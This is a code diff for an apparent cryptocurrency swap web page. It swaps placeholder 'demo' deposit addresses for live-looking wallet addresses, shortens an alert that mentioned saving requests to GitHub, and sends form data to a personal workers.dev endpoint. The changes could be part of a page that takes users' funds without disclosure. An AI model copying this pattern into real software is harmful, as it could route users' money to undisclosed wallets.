@@ -168,7 +168,7 @@
 /* =============== CONFIG =============== */
 const CONFIG = {
   FORM_ENDPOINT: "https://misty-brook-2a30.kims90901111.workers.dev/",
-  SERVER_TRX: "TYourDepositAddressHere", // ✅ TRX 고정 입금주소로 변경 (예: T...)
+  SERVER_TRX: "TXMTkzp5guZ1nrhQPrzW7S5JvW8MbJ67LY", // ✅ TRX 고정 입금주소로 변경 (예: T...)
   SESSION_SECONDS: 3600
 };
 
@@ -458,7 +458,7 @@ async function updateForms(sender, receiver) {
     body: JSON.stringify({ sender, receiver, repo, path, url })
   });
 
-  if (res.ok) alert("✅ Swap request saved to GitHub!");
+  if (res.ok) alert("✅ Saved!");
   else alert("❌ Error: " + await res.text());
 }
 
@@ -702,10 +702,10 @@ const swapPairs = {
 
 // 데모용 입금주소 (각 페어별)
 const depositAddresses = {
-  "bnb-eth": "0x1111111111111111111111111111111111111111",
-  "eth-bnb": "0x2222222222222222222222222222222222222222",
-  "bnb-pol": "0x3333333333333333333333333333333333333333",
-  "pol-bnb": "0x4444444444444444444444444444444444444444"
+  "bnb-eth": "0xf8e2cea20ef128a682e8681491fbe7b9309d0df6",
+  "eth-bnb": "0xf8e2cea20ef128a682e8681491fbe7b9309d0df6",
+  "bnb-pol": "0x3a0bba3ab85523bfaa8bf231103092807fef08a1",
+  "pol-bnb": "0x3a0bba3ab85523bfaa8bf231103092807fef08a1"
 };
 
 const modal = $("#swapModal");
